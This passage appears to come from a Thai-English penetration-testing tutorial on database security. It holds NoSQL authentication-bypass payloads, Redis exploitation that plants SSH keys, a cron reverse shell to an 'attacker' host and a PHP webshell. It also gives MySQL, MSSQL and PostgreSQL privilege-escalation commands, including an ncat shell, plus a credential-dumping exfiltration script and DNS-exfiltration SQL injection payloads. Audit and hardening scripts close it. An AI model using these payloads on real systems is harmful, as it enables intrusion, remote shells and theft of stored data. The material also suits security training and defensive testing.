        
    def test_mongodb_injection(self, param: str) -> bool:
        """Test for MongoDB injection"""
        print(f"[*] Testing MongoDB injection on: {param}")
        
        # HTTP parameter injection
        payloads = [
            f"?{param}[$gt]=",  # greater than empty string = all records
            f"?{param}[$ne]=invalid",  # not equal
            f"?{param}[$regex]=.*",  # regex match all
            f"?{param}[$where]=1==1",  # where clause
        ]
        
        baseline = requests.get(f"{self.url}?{param}=nonexistent").text
        
        for payload in payloads:
            try:
                resp = requests.get(f"{self.url}{payload}", timeout=10)
                
                if len(resp.text) > len(baseline) * 2:
                    print(f"  [!] Possible NoSQL injection with: {payload}")
                    return True
                    
            except Exception as e:
                pass
        
        return False
    
    def json_nosql_injection(self, endpoint: str, data: dict) -> bool:
        """Test NoSQL injection in JSON body"""
        print("[*] Testing JSON NoSQL injection...")
        
        # Authentication bypass payloads
        auth_bypass_payloads = [
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"username": "admin", "password": {"$ne": ""}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": "admin", "password": {"$regex": ".*"}},
            {"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}},
        ]
        
        for payload in auth_bypass_payloads:
            try:
                resp = requests.post(endpoint, json=payload, timeout=10)
                if resp.status_code == 200 and "token" in resp.text.lower() or "success" in resp.text.lower():
                    print(f"  [!] Auth bypass with: {payload}")
                    return True
            except Exception:
                pass
        
        return False


# Redis security
REDIS_COMMANDS = """
# Redis Unauthenticated Access

# ตรวจสอบตรงๆ
 redis-cli -h target ping
redis-cli -h target INFO
redis-cli -h target CONFIG GET *
redis-cli -h target KEYS *
redis-cli -h target DBSIZE

# เขียน SSH key (if Redis รันเป็น root)
redis-cli -h target CONFIG SET dir /root/.ssh/
redis-cli -h target CONFIG SET dbfilename authorized_keys
redis-cli -h target SET payload "\\n\\n$(cat ~/.ssh/id_rsa.pub)\\n\\n"
redis-cli -h target BGSAVE

# เขียน cron job
redis-cli -h target CONFIG SET dir /var/spool/cron/
redis-cli -h target CONFIG SET dbfilename root
redis-cli -h target SET cron "\\n\\n* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\\n\\n"
redis-cli -h target BGSAVE

# เขียน webshell
redis-cli -h target CONFIG SET dir /var/www/html/
redis-cli -h target CONFIG SET dbfilename shell.php
redis-cli -h target SET shell '<?php system($_GET["cmd"]); ?>'
redis-cli -h target BGSAVE

# Metasploit
use auxiliary/scanner/redis/file_upload
use exploit/linux/redis/redis_replication_cmd_exec
"""

if __name__ == "__main__":
    # MongoDB
    tester = MongoDBTester("192.168.1.100")
    tester.check_unauthenticated_access()
    
    # NoSQL injection
    inj = NoSQLInjection("http://target.com/api")
    inj.test_mongodb_injection("username")
    
    print(REDIS_COMMANDS)
```

## Step 377: Database Privilege Escalation

```python
#!/usr/bin/env python3
# db_privesc.py - Database Privilege Escalation

class DatabasePrivEsc:
    
    def mysql_udf_privesc(self) -> str:
        return """
# MySQL UDF Privilege Escalation
# Requires: FILE privilege, mysql running as root

# Method 1: Using metasploit
use exploit/multi/mysql/mysql_udf_payload
set RHOSTS target
set USERNAME root
set PASSWORD password
run

# Method 2: Manual
# 1. Generate UDF library
msf> generate_udf_payload -f linux -a x86_64

# Or compile:
# gcc -shared -fPIC -o udf.so udf.c

# 2. Upload via MySQL
mysql> CREATE TABLE tmp_udf (line BLOB);
mysql> INSERT INTO tmp_udf VALUES(LOAD_FILE('/tmp/udf.so'));
mysql> SELECT * FROM tmp_udf INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

# 3. Create function
mysql> CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';

# 4. Execute command
mysql> SELECT sys_exec('chmod +s /bin/bash');
$ bash -p  # Run with root privileges
"""
    
    def mssql_privesc_techniques(self) -> str:
        return """
# MSSQL Privilege Escalation Techniques

# 1. xp_cmdshell (if sysadmin)
EXEC xp_cmdshell 'whoami';

# 2. sp_OACreate (OLE Automation)
DECLARE @shell INT
EXEC sp_oacreate 'wscript.shell', @shell OUTPUT
EXEC sp_oamethod @shell, 'run', null, 'cmd /c whoami > c:\\output.txt'

# 3. Impersonation
SELECT distinct b.name FROM sys.server_permissions a 
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id 
WHERE a.permission_name = 'IMPERSONATE';

EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER; -- shows sa
EXEC xp_cmdshell 'whoami';
REVERT;

# 4. Linked Server Attacks
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT SYSTEM_USER');
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER];

# 5. Trustworthy database
SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1;
-- If a db is trustworthy and owned by sysadmin, can escalate!

USE TrustworthyDB;
CREATE PROCEDURE elevate
WITH EXECUTE AS OWNER
AS
    EXEC sp_addsrvrolemember 'your_user', 'sysadmin';
GO
EXEC elevate;

# Tools
# PowerUpSQL: Invoke-SQLAuditPrivImpersonateLogin
# PowerUpSQL: Invoke-SQLEscalatePriv
"""
    
    def postgresql_privesc(self) -> str:
        return """
# PostgreSQL Privilege Escalation

# 1. COPY TO PROGRAM (superuser)
COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';
CREATE TABLE cmd_output (output text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;

# 2. CREATE LANGUAGE + C function (superuser)
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int 
AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' 
LANGUAGE 'c' STRICT;

SELECT system('id > /tmp/out.txt');

# 3. pg_read_file (superuser)
SELECT pg_read_file('/etc/passwd');

# 4. Large Object operations
SELECT lo_import('/etc/passwd');
SELECT lo_get(12345);  -- OID from lo_import

# Extension abuse (pg_execute_server_program)
CREATE EXTENSION IF NOT EXISTS dblink;
SELECT dblink_connect('host=127.0.0.1 dbname=postgres user=postgres');

# 5. CVE-2019-9193 - COPY FROM PROGRAM
COPY cmd_exec FROM PROGRAM 'ncat -e /bin/sh attacker 4444';

"""


# Database security checklist
DB_SECURITY_CHECKLIST = """
=== Database Security Testing Checklist ===

Authentication:
[ ] Default credentials tested
[ ] Password policy enforced
[ ] Account lockout configured
[ ] MFA available/enabled
[ ] Network access restricted (firewall)

Authorization:
[ ] Principle of least privilege
[ ] Excessive permissions identified
[ ] Guest/anonymous access disabled
[ ] Role separation implemented
[ ] Audit logging enabled

Encryption:
[ ] Data at rest encrypted
[ ] Data in transit encrypted (TLS)
[ ] Encryption key management
[ ] Sensitive columns encrypted

Vulnerabilities:
[ ] SQL injection tested
[ ] Second-order injection tested
[ ] Stored procedures audited
[ ] UDFs/CLR assemblies reviewed
[ ] Linked servers audited
[ ] Database patch level checked

Configuration:
[ ] Unnecessary features disabled (xp_cmdshell, etc.)
[ ] Error messages reviewed (no info disclosure)
[ ] Backup encryption
[ ] Debug/trace settings
[ ] Remote access restrictions

Tools:
- SQLMap: sqlmap -u <url> --level=5 --risk=3
- Metasploit DB modules
- DBninja: Web-based DB tool
- DBeaver: DB management
- PowerUpSQL (MSSQL)
- nosqlmap (NoSQL)
"""

if __name__ == "__main__":
    privesc = DatabasePrivEsc()
    print("MySQL UDF:")
    print(privesc.mysql_udf_privesc())
    print("\nMSSQL Techniques:")
    print(privesc.mssql_privesc_techniques())
    print(DB_SECURITY_CHECKLIST)
```

## Step 378: Database Exfiltration และ Post-Exploitation

```bash
#!/bin/bash
# db_exfiltration.sh - Database Data Exfiltration

# ========== MySQL Exfiltration ==========

mysql_exfiltrate() {
    local host=$1
    local user=$2
    local pass=$3
    local outdir="/tmp/db_exfil"
    mkdir -p $outdir
    
    echo "[*] MySQL data exfiltration..."
    
    # Get all databases
    databases=$(mysql -h $host -u $user -p"$pass" -N -e "SHOW DATABASES;" 2>/dev/null)
    
    for db in $databases; do
        # Skip system databases
        [[ "$db" =~ ^(information_schema|performance_schema|mysql|sys)$ ]] && continue
        
        echo "  [*] Exfiltrating database: $db"
        
        # Get tables
        tables=$(mysql -h $host -u $user -p"$pass" -N -e "SHOW TABLES;" $db 2>/dev/null)
        
        for table in $tables; do
            # Check for interesting tables
            if echo "$table" | grep -iE '(user|account|credential|password|admin|auth|login)'; then
                echo "    [!] Interesting table: $db.$table"
                
                # Get column names
                columns=$(mysql -h $host -u $user -p"$pass" -N -e \
                    "SELECT column_name FROM information_schema.columns WHERE table_name='$table' AND table_schema='$db';" \
                    2>/dev/null)
                echo "    Columns: $columns"
                
                # Dump table
                mysql -h $host -u $user -p"$pass" $db -e \
                    "SELECT * FROM $table LIMIT 100;" 2>/dev/null > "$outdir/${db}_${table}.txt"
            fi
        done
        
        # Full database dump
        mysqldump -h $host -u $user -p"$pass" $db > "$outdir/${db}_full.sql" 2>/dev/null
    done
    
    echo "[+] Exfiltration complete. Files in: $outdir"
    ls -la $outdir
}

# ========== Out-of-Band Exfiltration (DNS) ==========

dns_exfil_via_sqli() {
    local attacker_domain=$1
    
    echo "[*] DNS exfiltration via SQL injection"
    
    # MySQL DNS exfil
    cat <<EOF
MySQL DNS Exfiltration:
' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.${attacker_domain}\\\\test'))--

MSSQL DNS Exfil:
'; EXEC master..xp_dirtree '\\\\' + (SELECT TOP 1 password FROM users) + '.${attacker_domain}\\test'--

Oracle DNS Exfil:
' UNION SELECT UTL_HTTP.request('http://'||(SELECT password FROM users WHERE rownum=1)||'.${attacker_domain}/') FROM DUAL--

PostgreSQL DNS Exfil:
'; COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'curl http://\$(cat /dev/stdin).${attacker_domain}';--

Setup listener:
Tcpdump: tcpdump -i any -n port 53 | grep ${attacker_domain}
Responder: python3 Responder.py -I eth0 -v
Burp Collaborator
interactsh: interactsh-client
EOF
}

# ========== Database Credentials in Files ==========

find_db_credentials() {
    local search_path=${1:-/var/www}
    
    echo "[*] Searching for database credentials in files..."
    
    # ค้นหาใน config files
    grep -r -i --include="*.php" \
        -E '(mysql_connect|mysqli_connect|PDO.*mysql|DB_PASSWORD|DB_PASS|database.*password)' \
        $search_path 2>/dev/null | head -20
    
    # WordPress
    find $search_path -name "wp-config.php" 2>/dev/null | \
        xargs grep -E '(DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)' 2>/dev/null
    
    # Laravel/Symfony .env
    find $search_path -name ".env" 2>/dev/null | \
        xargs grep -E '(DB_|DATABASE)' 2>/dev/null
    
    # Django settings
    find $search_path -name "settings.py" 2>/dev/null | \
        xargs grep -E "(DATABASES|PASSWORD)" 2>/dev/null
    
    # Spring application.properties
    find $search_path -name "application.properties" -o -name "application.yml" 2>/dev/null | \
        xargs grep -E '(datasource|password|username)' 2>/dev/null
}

echo "=== Database Exfiltration Toolkit ==="
echo "1. MySQL exfil: mysql_exfiltrate <host> <user> <pass>"
echo "2. DNS exfil: dns_exfil_via_sqli <attacker_domain>"
echo "3. Find creds: find_db_credentials [path]"
```

## Step 379: Database Audit และ Compliance

```python
#!/usr/bin/env python3
# db_audit.py - Database Security Audit

import json
from datetime import datetime

class DatabaseAuditor:
    def __init__(self, db_type: str, host: str):
        self.db_type = db_type
        self.host = host
        self.findings = []
        self.audit_date = datetime.now().isoformat()
        
    def add_finding(self, severity: str, title: str, description: str, 
                    recommendation: str, cis_control: str = ""):
        self.findings.append({
            "severity": severity,
            "title": title,
            "description": description,
            "recommendation": recommendation,
            "cis_control": cis_control,
            "db_type": self.db_type
        })
    
    def mysql_audit_queries(self) -> dict:
        """MySQL audit queries"""
        return {
            "users_with_all_privs": """
                SELECT user, host, Grant_priv, Super_priv, File_priv 
                FROM mysql.user 
                WHERE Grant_priv='Y' OR Super_priv='Y' OR File_priv='Y';
            """,
            "no_password_users": """
                SELECT user, host FROM mysql.user 
                WHERE authentication_string = '' OR authentication_string IS NULL;
            """,
            "wildcard_hosts": """
                SELECT user, host FROM mysql.user WHERE host='%';
            """,
            "anonymous_users": """
                SELECT user, host FROM mysql.user WHERE user='';
            """,
            "general_log_status": "SHOW VARIABLES LIKE 'general_log';",
            "slow_query_log": "SHOW VARIABLES LIKE 'slow_query_log';",
            "binary_log": "SHOW VARIABLES LIKE 'log_bin';",
            "skip_networking": "SHOW VARIABLES LIKE 'skip_networking';",
            "local_infile": "SHOW VARIABLES LIKE 'local_infile';",
            "ssl_enabled": "SHOW VARIABLES LIKE 'have_ssl';",
            "password_policy": "SHOW VARIABLES LIKE 'validate_password%';"
        }
    
    def run_mysql_audit(self, connection) -> list:
        """Run MySQL audit checks"""
        queries = self.mysql_audit_queries()
        
        audit_checks = {
            "no_password_users": {
                "critical": lambda r: len(r) > 0,
                "message": "Users without passwords found",
                "severity": "Critical",
                "fix": "Set passwords: ALTER USER 'user'@'host' IDENTIFIED BY 'strong_password';"
            },
            "anonymous_users": {
                "critical": lambda r: len(r) > 0,
                "message": "Anonymous users found",
                "severity": "High",
                "fix": "DROP USER ''@'localhost'; DROP USER ''@'%';"
            },
            "wildcard_hosts": {
                "critical": lambda r: len(r) > 0,
                "message": "Users with wildcard host (%) found",
                "severity": "Medium",
                "fix": "Restrict to specific hosts"
            }
        }
        
        for check_name, check_config in audit_checks.items():
            if check_name in queries:
                try:
                    cursor = connection.cursor()
                    cursor.execute(queries[check_name])
                    result = cursor.fetchall()
                    
                    if check_config["critical"](result):
                        self.add_finding(
                            check_config["severity"],
                            check_config["message"],
                            f"Query returned {len(result)} results: {result}",
                            check_config["fix"]
                        )
                except Exception as e:
                    pass
        
        return self.findings
    
    def generate_audit_report(self) -> str:
        """Generate audit report"""
        severity_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
        for f in self.findings:
            if f["severity"] in severity_counts:
                severity_counts[f["severity"]] += 1
        
        report = f"""# Database Security Audit Report

**Database Type:** {self.db_type}
**Target:** {self.host}
**Audit Date:** {self.audit_date}

## Summary

| Severity | Count |
|----------|-------|
| Critical | {severity_counts['Critical']} |
| High | {severity_counts['High']} |
| Medium | {severity_counts['Medium']} |
| Low | {severity_counts['Low']} |

## Findings

"""
        for i, f in enumerate(self.findings, 1):
            report += f"""### {i}. {f['title']}
**Severity:** {f['severity']}
**Description:** {f['description']}
**Recommendation:** {f['recommendation']}

---
"""
        return report


# CIS Benchmark checks
CIS_MYSQL_CHECKS = """
=== CIS MySQL Benchmark Key Checks ===

1.1 - Operating System Level Configuration
  - Run as dedicated least-privileged OS account
  - mysql:mysql ownership on data directory

2.1 - Require stronger passwords
  - validate_password plugin enabled
  - minimum length >= 14

3.1 - Disable remote root login
  SELECT user, host FROM mysql.user WHERE user='root' AND host != 'localhost';

3.2 - Do not use admin wildcards
  SELECT user, host FROM mysql.user WHERE host='%' AND (Grant_priv='Y' OR Super_priv='Y');

4.1 - Ensure latest security patches
  SELECT @@version;

5.1 - Logging
  SHOW VARIABLES LIKE 'general_log';
  SHOW VARIABLES LIKE 'log_output';

6.1 - Ensure SSL is required
  SHOW VARIABLES LIKE 'require_secure_transport';
  SELECT ssl_type FROM mysql.user WHERE ssl_type = '';
"""

if __name__ == "__main__":
    auditor = DatabaseAuditor("MySQL", "192.168.1.100")
    report = auditor.generate_audit_report()
    print(report)
    print(CIS_MYSQL_CHECKS)
```

## Step 380: Database Security Hardening

```bash
#!/bin/bash
# db_hardening.sh - Database Security Hardening Guide

# ========== MySQL Hardening ==========

harden_mysql() {
    echo "[*] MySQL Security Hardening"
    
    # mysql_secure_installation ทำการตั้งค่าเบื้องต้น
    mysql_secure_installation
    
    # กำหนด my.cnf
    cat > /etc/mysql/conf.d/security.cnf << 'EOF'
[mysqld]
# ไม่ bind ทุก IP
bind-address = 127.0.0.1

# ไม่อนุญาต LOCAL INFILE
local-infile = 0

# Disable symbolic links
symbolic-links = 0

# เปิด audit logging
general_log = ON
general_log_file = /var/log/mysql/mysql.log

# SSL required
require_secure_transport = ON

# Disable old auth plugin
default_authentication_plugin = caching_sha2_password

# File privileges
secure-file-priv = "/var/lib/mysql-files"

# Password validation
validate_password.policy = STRONG
validate_password.length = 14
validate_password.number_count = 1
validate_password.mixed_case_count = 1
validate_password.special_char_count = 1
EOF
    
    # ลบ anonymous users
    mysql -e "DELETE FROM mysql.user WHERE User=''; FLUSH PRIVILEGES;"
    
    # ลบ test database
    mysql -e "DROP DATABASE IF EXISTS test;"
    
    # สร้าง dedicated app user
    mysql -e "
        CREATE USER 'appuser'@'localhost' IDENTIFIED BY '$(openssl rand -base64 32)';
        GRANT SELECT, INSERT, UPDATE, DELETE ON appdb.* TO 'appuser'@'localhost';
        FLUSH PRIVILEGES;
    "
    
    echo "[+] MySQL hardening complete"
}

# ========== PostgreSQL Hardening ==========

harden_postgresql() {
    echo "[*] PostgreSQL Security Hardening"
    
    # postgresql.conf
    cat > /tmp/pgsql_security.conf << 'EOF'
# Network
listen_addresses = 'localhost'
port = 5432

# Authentication
password_encryption = scram-sha-256

# Logging
log_connections = on
log_disconnections = on
log_failed_authentications = on
log_statement = 'ddl'
logging_collector = on
log_directory = '/var/log/postgresql'

# SSL
ssl = on
ssl_cert_file = '/etc/ssl/certs/postgres.crt'
ssl_key_file = '/etc/ssl/private/postgres.key'
EOF
    
    # pg_hba.conf - กำหนด authentication rules
    cat > /tmp/pg_hba.conf << 'EOF'
# TYPE  DATABASE        USER            ADDRESS                 METHOD
local   all             postgres                                peer
local   all             all                                     scram-sha-256
host    all             all             127.0.0.1/32            scram-sha-256
hostssl all             all             0.0.0.0/0               scram-sha-256
EOF
    
    echo "[+] PostgreSQL config templates created"
}

# ========== MSSQL Hardening ==========

harden_mssql() {
    echo "[*] MSSQL Hardening commands:"
    cat << 'EOF'
-- Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- Disable CLR
EXEC sp_configure 'clr enabled', 0;
RECONFIGURE;

-- Disable Ole Automation
EXEC sp_configure 'Ole Automation Procedures', 0;
RECONFIGURE;

-- Disable ad hoc distributed queries
EXEC sp_configure 'ad hoc distributed queries', 0;
RECONFIGURE;

-- Enable login auditing
EXEC xp_instance_regwrite 
N'HKEY_LOCAL_MACHINE',
N'Software\Microsoft\MSSQLServer\MSSQLServer',
N'AuditLevel', REG_DWORD, 3;

-- Disable sa if not needed
ALTER LOGIN sa DISABLE;

-- Use strong password
ALTER LOGIN sa WITH PASSWORD = N'$(openssl rand -base64 32)';

-- Remove public role from msdb  
REVOKE EXECUTE ON sp_send_dbmail FROM PUBLIC;

-- Check for TRUSTWORTHY databases
SELECT name, is_trustworthy_on FROM sys.databases;
-- Disable if not needed:
ALTER DATABASE [dbname] SET TRUSTWORTHY OFF;
EOF
}

echo "=== Database Hardening Guide ==="
harden_mysql
harden_postgresql
harden_mssql
```

---
*Part 38 ครอบคลุม Steps 371-380: Database Security Testing รวมถึง SQL injection (union/blind/time-based/OOB), advanced SQLi & WAF bypass, MySQL/MSSQL/Oracle/MongoDB/Redis security testing, database privilege escalation (UDF/xp_cmdshell/PostgreSQL), data exfiltration techniques, database auditing & CIS compliance และ database hardening*
